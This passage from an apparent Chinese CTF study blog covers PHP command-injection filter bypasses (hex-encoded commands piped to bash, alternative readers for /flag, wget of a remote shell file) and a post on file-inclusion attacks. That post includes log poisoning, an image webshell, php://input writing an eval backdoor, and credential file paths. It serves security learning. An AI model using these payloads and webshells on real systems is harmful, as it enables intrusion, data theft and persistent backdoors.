b&quot;tac flag&quot;h = binascii.b2a_hex(s)print(h)</code></pre><p>tac flag–&gt; 74616320666c6167</p><pre><code class="highlight plaintext">echo &quot;74616320666c6167”|xxd -r -p|bash</code></pre><h4 id="xxd-二进制显示和处理文件工具。"><a href="#xxd-二进制显示和处理文件工具。" class="headerlink" title="xxd: 二进制显示和处理文件工具。"></a>xxd: 二进制显示和处理文件工具。</h4><p>-r-p将纯十六进制转储的反向输出打印为了ASCII格式<br>bash、sh、&#x2F;bin&#x2F;bash、反引号等</p><pre><code class="highlight plaintext">?cmd=passthru(&#x27;echo &quot;74616320666c6167”|xxd -r -p|bash&#x27;);</code></pre><h4 id="shellcode编码（16进制的机器码）"><a href="#shellcode编码（16进制的机器码）" class="headerlink" title="shellcode编码（16进制的机器码）"></a>shellcode编码（16进制的机器码）</h4><pre><code class="highlight plaintext">?cmd=passthru(&#x27;printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;|bash&#x27;);?cmd=passthru(&#x27;`printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;`&#x27;);?cmd=passthru(&#x27;$(printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;)&#x27;);</code></pre><h2 id="读取命令被绕过："><a href="#读取命令被绕过：" class="headerlink" title="读取命令被绕过："></a>读取命令被绕过：</h2><p>比如说过滤了cat，在这之前先分清:</p><p><code>cat flag.php</code> 是用于在终端上显示当前目录下名为 <code>flag.php</code> 的文件的内容。</p><p><code>cat /flag</code> 是用于在终端上显示根目录下名为 flag 的文件的内容。</p><p><code>cat flag</code> 是用于在终端上显示当前目录下名为 flag 的文件的内容。</p><p>正常来说flag放在根目录下，不过也可能是在当前网页目录下</p><p>别的指令也同理</p><ul><li><p>tac:反向显示，从最后一行开始往前显示</p><pre><code class="highlight plaintext">tac /flag</code></pre></li><li><p>more:一页一页显示档案内容</p><pre><code class="highlight plaintext">more flag.php</code></pre></li><li><p>less：与more类似</p></li><li><p>tail：查看末尾几行</p></li><li><p>nl：显示的时候，顺便输出行号</p><pre><code class="highlight plaintext">nl /flag</code></pre></li></ul><p><code>nl /flag</code> 和 <code>nl flag</code> 是不同的。</p><p>在 Linux 系统中，<code>nl</code>命令用于给文件添加行号。当使用 <code>nl /flag</code> 命令时，<code>/flag</code> 被视为一个文件路径，并将该文件的内容输出到标准输出（通常是终端），并在每一行前添加行号。如果 &#x2F;flag 文件存在且有读取权限，那么 <code>nl /flag</code> 将会给该文件的内容添加行号。</p><p>而当使用 <code>nl flag</code> 命令时，flag 被视为一个相对于当前目录的文件路径。也就是说，<code>nl flag</code> 命令将会尝试在当前目录下找到名为 flag 的文件，并给其内容添加行号。（不过flag一般在根目录）</p><ul><li>od：以二进制方式读取档案内容。正常的<code>od /flag</code>输出的纯纯二进制<br>想看到文件内容需要：</li></ul><pre><code class="highlight plaintext">passthru(&quot;od -A d -c /fla\g&quot;);</code></pre><ul><li><p>xxd：读取二进制文件</p><pre><code class="highlight plaintext">xxd /flag</code></pre></li><li><p>sort：主要用于排序文件 </p><pre><code class="highlight plaintext">so?t /flag/usr/bin/s?rt /flag</code></pre></li></ul><p><code>/usr/bin/sort</code> 和 <code>sort</code> 实际上是同一个命令。<code>/usr/bin</code> 目录是系统的标准目录之一，它包含了许多系统命令和工具的二进制文件，而 sort 命令通常就存放在 <code>/usr/bin</code> 目录中,因此<code>/usr/bin/sort /flag</code> 和 <code>sort /flag</code> 是等价的。有时候sort不行可能<code>/usr/bin/s?r</code>t可以</p><ul><li>uniq：报告或删除文件中重复的行，其实当成cat用就行</li><li>file -f:报错出具体内容<br>passthru(“file -f &#x2F;flag”);</li><li>grep：在文本中查找指定字符串<br>passthru(“grep fla &#x2F;fla*”);</li></ul><p>grep fla &#x2F;fla* 命令会匹配根目录下所有以 fla 开头的文件（不包括子目录），然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令会搜索根目录下以 fla 开头的所有文件，并匹配其中包含 fla 字符串的行。</p><p>而 grep fla fla* 命令中 fla* 是当前目录下以 fla 开头的所有文件的通配符，它会匹配当前目录下所有以 fla 开头的文件，然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令只会搜索当前目录下以 fla 开头的文件，并匹配其中包含 fla 字符串的行。</p><ul><li>strings：<br>相当于cat</li></ul><h2 id="无回显时间盲注："><a href="#无回显时间盲注：" class="headerlink" title="无回显时间盲注："></a>无回显时间盲注：</h2><p>逻辑和SQL注入的时间盲注差不多</p><p>相关命令：<br>1.sleep<br>sleep 5       #5秒之后返回结果</p><p>2.awk：逐行获取数据<br>3.cut -c<br>cut命令逐列获取单个字符<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 1      #获取第一个字符<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 2      #获取第二个字符</p><p>3.利用cp命令：cp flag.php 1.txt</p><p>4.利用mv命令：mv flag.php 1.txt</p><p>5.利用&gt;输出结果到文件：ls &gt; 1.txt</p><p>6.tee:Linux tee命令用于读取标准输入的数据，并将其内容输出成文件</p><p>7.利用wget下载：</p><pre><code class="highlight plaintext">wget http://ip/shell.txt &gt; shell.php或者wget http://ip/shell.txt -O shell.php</code></pre><p>8.dnslog外带数据</p><h2 id="都是fakeflag-试试环境变量-proc-self-environ和env指令"><a href="#都是fakeflag-试试环境变量-proc-self-environ和env指令" class="headerlink" title="都是fakeflag ,试试环境变量&#x2F;proc&#x2F;self&#x2F;environ和env指令"></a>都是fakeflag ,试试环境变量&#x2F;proc&#x2F;self&#x2F;environ和env指令</h2><h2 id="无参数"><a href="#无参数" class="headerlink" title="无参数"></a>无参数</h2><p>最近打比赛看到一些无参的题目，拿来研究一下</p><h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h3><p>*scandir()<em>函数可以返回当前目录中的所有文件和目录的列表。通过结合</em>localeconv()<em>和</em>current()*函数，可以构造出一个返回当前目录文件列表的payload。例如：</p><pre><code class="highlight plaintext">?exp=var_dump(scandir(current(localeconv())));</code></pre><p>在这个例子中，**localeconv()<strong>返回一个包含本地数字及货币格式信息的数组，其中第一个元素是*.*，表示当前目录。</strong>current()<strong>函数取出这个*.*，然后传递给</strong>scandir()**函数，最终返回当前目录的文件列表<a href="https://blog.csdn.net/2301_76690905/article/details/133808536">1</a>。</p><h3 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h3><p>当请求头中有cookie时，可以使用**session_id()<strong>函数来获取当前会话ID。通过将命令进行十六进制编码，然后使用</strong>hex2bin()**解码，可以实现命令执行。例如：</p><pre><code class="highlight plaintext">?exp=eval(hex2bin(session_id(session_start())));</code></pre><p>同时，需要在cookie中设置相应的十六进制编码值</p><h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h3><p>*getallheaders()<em>函数返回当前请求的所有请求头信息。可以在请求头中添加恶意代码，然后使用</em>end()*函数指向最后一个请求头，使其执行。例如：</p><pre><code class="highlight plaintext">var_dump(end(getallheaders()));</code></pre><p>在数据包最后一行添加一个请求头，例如*sky: phpinfo();<em>，然后</em>end()*函数会指向这个请求头并执行其中的代码。</p><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p><em>get_defined_vars()<em>函数返回所有定义的变量，包括全局变量</em>$_GET</em>、*$_POST<em>、</em>$_COOKIE*等。可以通过添加多个参数来构造payload。例如：</p><pre><code class="highlight plaintext">?a=eval(end(current(get_defined_vars())));&amp;b=system(&#x27;ls /&#x27;);</code></pre><p>这样可以执行**system(‘ls &#x2F;‘)**命令。</p><h3 id="chdir-array-rand"><a href="#chdir-array-rand" class="headerlink" title="chdir() &amp; array_rand()"></a>chdir() &amp; array_rand()</h3><p>通过目录遍历来读取文件。例如，使用*getcwd()<em>获取当前目录，然后使用</em>dirname()*列出父目录中的所有文件和目录。例如：</p><pre><code class="highlight plaintext">?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</code></pre><h3 id="session-id-1"><a href="#session-id-1" class="headerlink" title="session_id()"></a>session_id()</h3><pre><code class="highlight plaintext">?code=session_start();eval(hex2bin(session_id()));Cookie: PHPSESSID=636174202f666c6167</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> -Web -CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2025/01/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2025/01/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>依赖于<code>include()</code>,<code>require()</code>,<code>include_once()</code>,<code>require_once()</code>这些函数的漏洞</p><p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含</p><p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p><p><strong>#</strong> <strong>几个函数的区别</strong></p><p>require():找不到被包含的文件会产生致命错误，并停止脚本运行<br>include():找不到被包含的文件只会产生警告，脚本继续执行<br>require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含<br>include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</p><p>只要文件中存在<code>php</code>代码都会被解析出来</p><h2 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h2><p>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)<br>测试网页包含如下代码:</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];<span class="keyword">include</span>(<span class="variable">$file</span>);<span class="meta">?&gt;</span></code></pre><p>网站利用文件包含功能读取一些<code>php</code>文件，例如<code>phpinfo</code>:</p><p>也可以包含木马</p><p>利用该代码，我们可以读取一些系统本地的敏感信息。<br>例如:<code>C:\Windows\system.ini</code>文件。<br>（1）使用绝对路径<br>使用绝对路径直接读取:</p><p>（2）使用相对路径进行读取<br>通过.&#x2F;表示当前位置路径，<code>../</code>表示上一级路径位置，在linux中同样适用。</p><p>例如当前页面所在路径为<code>C:\Apache24\htdocs\</code>，我们需要使用…&#x2F;退到C盘再进行访问，构造路径如下：<br><code>../../windows/system.ini</code></p><p>由于我的环境搭建在D盘，所以这里就不做演示了。</p><p>（3）一些常见的敏感目录信息路径:<br>Windows系统:</p><pre><code class="highlight plaintext">C:\boot.ini //查看系统版本C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件C:\windows\repair\sam //存储Windows系统初次安装的密码C:\ProgramFiles\mysql\my.ini //Mysql配置C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码C:\windows\php.ini //php配置信息Linux/Unix系统:/etc/password //账户信息/etc/shadow //账户密码信息/usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置/usr/local/app/php5/lib/php.ini //PHP相关配置/etc/httpd/conf/httpd.conf //Apache配置文件/etc/my.conf //mysql配置文件</code></pre><p>三、LFI漏洞利用技巧<br>1.配合文件上传使用<br>有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。</p><p>以DVWA平台为例，将Security Level选择low，编辑一个图片马，内容如下:</p><pre><code class="highlight plaintext">&lt;?phpfwrite(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[123]);?&gt;);?&gt;</code></pre><p>找到上传点进行上传：</p><p>得到文件保存的完整路径</p><p>现在我们利用页面去执行我们上传的图片马</p><p>有能够读取文件的php页面，直接构造url读取，代码成功解析</p><p>注：我们也可以直接在webshell.jpg中写一句话木马，然后再通过文件包含漏洞去连接webshell.jpg，但这种方法有时候webshell功能会出现异常。所以我们选择上面的方式，生成一个.php格式的一句话木马，再去连接。</p><p>2.包含Apache日志文件<br>有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。</p><p>在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log，日志文件如下:</p><p>当我们正常访问一个网页时，如&#96;<a href="http://127.0.0.1/phpinfo.php%EF%BC%8Caccess%E6%97%A5%E5%BF%97%E4%BC%9A%E8%BF%9B%E8%A1%8C%E8%AE%B0%E5%BD%95%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE%E6%89%80%E7%A4%BA">http://127.0.0.1/phpinfo.php，access日志会进行记录，如下图所示</a>:</p><p>如果我们访问一个不存在的资源，也一样会进行记录，例如访问</p><pre><code class="highlight plaintext">127.0.0.1&lt;?php phpinfo();?&gt;</code></pre><p>网页会显示403</p><p>但查看日志会发现被成功记录但被编码了</p><p>我们再次进行访问，并使用burp抓包，发现被编码：</p><p>我们将报文修改回去，再进行发送即可：</p><p>此时再查看access日志，正确写入php代码：</p><p>再通过本地文件包含漏洞访问，即可执行</p><p>我们可以在此处写入一句话木马，再使用webshell管理工具进行连接。</p><p>3.包含SESSION文件<br>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p><p>利用条件:</p><p>找到Session内的可控变量<br>Session文件可读写，并且知道存储路径<br>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p><p>session常见存储路径:</p><p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID<br>session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。<br>相关案例可以查看这道CTF题一道CTF题：PHP文件包含</p><p>4.包含临时文件</p><p>php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。</p><p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。</p><p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。</p><p>这个方法可以参考LFI With PHPInfo Assistance<br>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题： XMAN夏令营-2017-babyweb-writeup</p><h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h2><h2 id="必备知识-php伪协议"><a href="#必备知识-php伪协议" class="headerlink" title="必备知识:php伪协议"></a>必备知识:php伪协议</h2><h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a><code>file://</code> 协议</h3><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off&#x2F;on</li><li><code>allow_url_include</code> :off&#x2F;on</li></ul></li><li><p><strong>作用</strong>：<br>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p></li><li><p><strong>说明</strong>：<br><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以&#x2F;、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path </code>会可选地搜索，也作为相对的路径。</p></li><li><p><strong>用法</strong>：</p><pre><code class="highlight pgsql">/<span class="type">path</span>/<span class="keyword">to</span>/file.extrelative/<span class="type">path</span>/<span class="keyword">to</span>/file.extfileInCwd.extC:/<span class="type">path</span>/<span class="keyword">to</span>/winfile.extC:\<span class="type">path</span>\<span class="keyword">to</span>\winfile.ext\\smbserver\<span class="keyword">share</span>\<span class="type">path</span>\<span class="keyword">to</span>\winfile.extfile:///<span class="type">path</span>/<span class="keyword">to</span>/file.ext</code></pre></li><li><p><strong>示例</strong>：</p><ol><li><p><code>file://[文件的绝对路径和文件名]</code></p><pre><code class="highlight http">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></pre><p><img src="https://segmentfault.com/img/bVbrQAZ" alt="图片描述"></p></li><li><p><code>[文件的相对路径和文件名]</code></p><pre><code class="highlight http">http://127.0.0.1/include.php?file=./phpinfo.txt</code></pre><p><img src="https://segmentfault.com/img/bVbrQA1" alt="图片描述"></p></li><li><p><code>[http：//网络路径和文件名]</code></p><pre><code class="highlight http">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><p><img src="https://segmentfault.com/img/bVbrQBb" alt="图片描述"></p></li></ol></li><li><p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=YtcHVUno34rLTBJUcxsHxA==.SAMo1ZcMmiqVqJxFosbgOTO2nJi4mSvGX5no8jrMTl7u2z1qAxlTLJm6Xm7Rs3Ze">http://php.net/manual/zh/wrappers.file.php</a></p></li></ul><h3 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a><code>php://</code> 协议</h3><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off&#x2F;on</li><li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</li></ul></li><li><p><strong>作用</strong>：<br><code>php://</code> 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p></li><li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php:&#x2F;&#x2F;input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td></tr><tr><td>php:&#x2F;&#x2F;output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php:&#x2F;&#x2F;fd</td><td>(&gt;&#x3D;5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp</td><td>(&gt;&#x3D;5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php:&#x2F;&#x2F;filter</td><td>(&gt;&#x3D;5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table></li><li><p><strong><code>php://filter</code>参数详解</strong></p><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p><table><thead><tr><th>php:&#x2F;&#x2F;filter 参数</th><th>描述</th><th></th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td><td></td></tr><tr><td>read&#x3D;&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td><td>*）分隔。</td></tr><tr><td>write&#x3D;&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td><td>）分隔。</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 <em>read&#x3D;</em> 或 <em>write&#x3D;</em> 作前缀的筛选器列表会视情况应用于读或写链。</td><td></td></tr></tbody></table></li><li><p><strong>可用的过滤器列表（4类）</strong></p><p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://link.segmentfault.com/?enc=XLl1qyeGwRWWMG9dw9ESmQ==.0ts2nAacIjZZ+DTLJ5T0ocshPXAgZLYKgYBybI8Dc7yazO2QRQTOjf/jsO5rq19t">https://www.php.net/manual/zh/filters.php</a></p><table><thead><tr><th>字符串过滤器</th><th>作用</th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于<code>str_rot13()</code>，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于<code>strtoupper()</code>，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于<code>strtolower()</code>，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td></tr></tbody></table><table><thead><tr><th>转换过滤器</th><th>作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td>quoted-printable 字符串与 8-bit 字符串编码解码</td></tr></tbody></table><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><table><thead><tr><th>加密过滤器</th><th>作用</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table></li><li><p><strong>示例</strong>：</p><ol><li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p><pre><code class="highlight livecodeserver"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="built_in">include</span>.php?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=phpinfo.php</code></pre><p><img src="https://segmentfault.com/img/bVbrQBf" alt="图片描述"></p></li><li><p><code>php://input + [POST DATA]</code>执行php代码</p><pre><code class="highlight php">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span>[POST DATA部分]<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></code></pre><p><img src="https://segmentfault.com/img/bVbrQBh" alt="图片描述"></p><p>若有写入权限，写入一句话木马</p><pre><code class="highlight php">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span>[POST DATA部分]<span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;1juhua.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></code></pre><p><img src="https://segmentfault.com/img/bVbrQBi" alt="图片描述"></p></li></ol></li><li><p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=AHKgds+Ge0QaKChQ1m1oog==.na4Zlt5y4duEWHHydmOSTh2NkSbiDQNUtTreUgqxsETwe3g04SdnSBMCMdEdQ27X">https://php.net/manual/zh/wrappers.php.php</a></p></li></ul><h3 id="zip-bzip2-zlib-协议"><a href="#zip-bzip2-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a><code>zip:// &amp; bzip2:// &amp; zlib://</code> 协议</h3><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off&#x2F;on</li><li><code>allow_url_include</code> :off&#x2F;on</li></ul></li><li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p></li><li><p><strong>示例</strong>：</p><ol><li><p><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</p><p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p><pre><code class="highlight http">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></pre><p><img src="https://segmentfault.com/img/bVbrQBj" alt="图片描述"></p></li><li><p><code>compress.bzip2://file.bz2</code></p><p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p><pre><code class="highlight http">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></pre><p><img src="https://segmentfault.com/img/bVbrQBt" alt="图片描述"></p></li><li><p><code>compress.zlib://file.gz</code></p><p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p><pre><code class="highlight http">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></pre><p><img src="https://segmentfault.com/img/bVbrQBu" alt="图片描述"></p></li></ol></li><li><p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=w0uak4RdRJUStEHdEK6h4w==.xhWZ9YsBZncXK/YcM6ZNJ5Jey44TQSRRDG2PDhW+VOCrc/wcHb6xJoP7Fff88EcMBe0t2zuSqAZeW77CzMA4ZQ==">http://php.net/manual/zh/wrappers.compression.php</a></p></li></ul><h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a><code>data://</code> 协议</h3><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p><strong>用法</strong>：</p><pre><code class="highlight dts"><span class="symbol">data:</span><span class="comment">//text/plain,</span><span class="symbol">data:</span><span class="comment">//text/plain;base64,</span></code></pre></li><li><p><strong>示例</strong>：</p><ol><li><p><code>data://text/plain,</code></p><pre><code class="highlight http">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></pre><p><img src="https://segmentfault.com/img/bVbrQBB" alt="图片描述"></p></li><li><p><code>data://text/plain;base64,</code></p><pre><code class="highlight http">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p><img src="https://segmentfault.com/img/bVbrQBD" alt="图片描述"></p></li></ol></li></ul><h3 id="http-https-协议"><a href="#http-https-协议" class="headerlink" title="http:// &amp; https:// 协议"></a><code>http:// &amp; https://</code> 协议</h3><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p></li><li><p><strong>用法</strong>：</p><pre><code class="highlight dts"><span class="symbol">http:</span><span class="comment">//example.com</span><span class="symbol">http:</span><span class="comment">//example.com/file.php?var1=val1&amp;var2=val2</span><span class="symbol">http:</span><span class="comment">//user:password@example.com</span><span class="symbol">https:</span><span class="comment">//example.com</span><span class="symbol">https:</span><span class="comment">//example.com/file.php?var1=val1&amp;var2=val2</span><span class="symbol">https:</span><span class="comment">//user:password@example.com</span></code></pre></li><li><p><strong>示例</strong>：</p><pre><code class="highlight http">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><p><img src="https://segmentfault.com/img/bVbrQBP" alt="图片描述"></p></li></ul><h3 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a><code>phar://</code> 协议</h3><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p><pre><code class="highlight http">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></pre><p><img src="https://segmentfault.com/img/bVbrQBX" alt="图片描述"></p><p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar:&#x2F;&#x2F;协议对象注入技术</strong>。</p><p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><h3 id="filter链绕过"><a href="#filter链绕过" class="headerlink" title="filter链绕过"></a>filter链绕过</h3><p>构造一串字符利用过滤器的性质构造(在已知文件前构造命令执行)或破坏字符(exit)</p><h4 id="base64特质"><a href="#base64特质" class="headerlink" 